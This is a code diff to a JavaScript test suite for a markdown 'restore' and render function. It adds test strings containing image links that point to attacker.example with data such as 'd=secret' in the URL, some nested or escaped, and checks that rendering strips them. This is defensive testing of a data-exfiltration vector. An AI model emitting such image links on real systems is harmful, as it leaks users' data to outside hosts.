@@ -57,7 +57,7 @@ describe("restore", () => {
     const container = document.createElement("div");
     container.innerHTML = renderMarkdown(
       restore(
-        "こんにちは ![秘密](https://attacker.example/p?d=secret) と ![参照][r] と ![略]\n\n図 ⟦K2⟧\n\n[r]: https://attacker.example/r\n[略]: https://attacker.example/s",
+        "こんにちは ![秘密](https://attacker.example/p?d=secret) と ![参照][r] と ![略] と ![入れ子 [n] 画像](https://attacker.example/n) と \\\\![逃げ](https://attacker.example/e)\n\n図 ⟦K2⟧\n\n[r]: https://attacker.example/r\n[略]: https://attacker.example/s",
         doc,
       ),
     );
@@ -66,6 +66,12 @@ describe("restore", () => {
     ]);
     expect(container.textContent).toContain("秘密");
     expect(container.innerHTML).not.toContain("d=secret");
+  });
+
+  it("keeps an exclamation mark that only precedes brackets in prose", () => {
+    const container = document.createElement("div");
+    container.innerHTML = renderMarkdown(restore("注意![重要] と 本当!", doc));
+    expect(container.textContent?.trim()).toBe("注意![重要] と 本当!");
   });
 
   it("drops tokens the document does not have", () => {
